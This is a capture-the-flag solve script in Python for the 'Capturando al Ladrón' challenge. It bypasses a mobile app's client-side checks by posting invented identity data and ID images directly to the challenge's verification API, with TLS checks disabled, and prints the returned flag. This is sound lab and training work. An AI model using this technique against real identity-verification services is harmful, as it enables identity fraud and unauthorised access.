#!/usr/bin/env python3
"""
Solución para el reto 'Capturando al Ladrón' (HackLab / SoftwareSeguro)
Categoría: Reversing APK / Broken Access Control (CWE-602)
"""

import os
import requests
import json

BASE_URL = "https://auth.shared.softwareseguro.com.ar"
VERIFY_URL = f"{BASE_URL}/api/verificar"

dir_path = os.path.dirname(os.path.realpath(__file__))
frente_path = os.path.join(dir_path, "frente.jpg")
dorso_path = os.path.join(dir_path, "dorso.jpg")

# Si no existen los .jpg, intentar con los .png
if not os.path.exists(frente_path):
    frente_path = os.path.join(dir_path, "cim-frente.png")
if not os.path.exists(dorso_path):
    dorso_path = os.path.join(dir_path, "cim-dorso.png")

print(f"[*] Usando frente: {frente_path}")
print(f"[*] Usando dorso:  {dorso_path}")

# Datos deducidos de VENKRA DOSS, KAIRA LOM (45 años en el año 264 -> nacida en 0219)
data = {
    "apellido": "VENKRA DOSS",
    "nombre": "KAIRA LOM",
    "matricula": "MRC-48217390",
    "sexo": "F",
    "fecha_nacimiento": "01/01/0219"
}

with open(frente_path, "rb") as f_frente, open(dorso_path, "rb") as f_dorso:
    files = {
        "foto_frente": ("frente.jpg", f_frente, "image/jpeg"),
        "foto_dorso": ("dorso.jpg", f_dorso, "image/jpeg")
    }
    
    print(f"[*] Enviando solicitud POST a {VERIFY_URL}...")
    resp = requests.post(VERIFY_URL, data=data, files=files, verify=False)
    
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Contenido:\n{resp.text}")
    
    try:
        res_json = resp.json()
        cert_url = res_json.get("certificado_url")
        if cert_url:
            if not cert_url.startswith("http"):
                cert_url = BASE_URL + cert_url
            print(f"\n[+] URL del Certificado: {cert_url}")
            cert_resp = requests.get(cert_url, verify=False)
            print(f"[+] Certificado / Flag:\n{cert_resp.text}")
    except Exception as e:
        print(f"Error al procesar JSON: {e}")
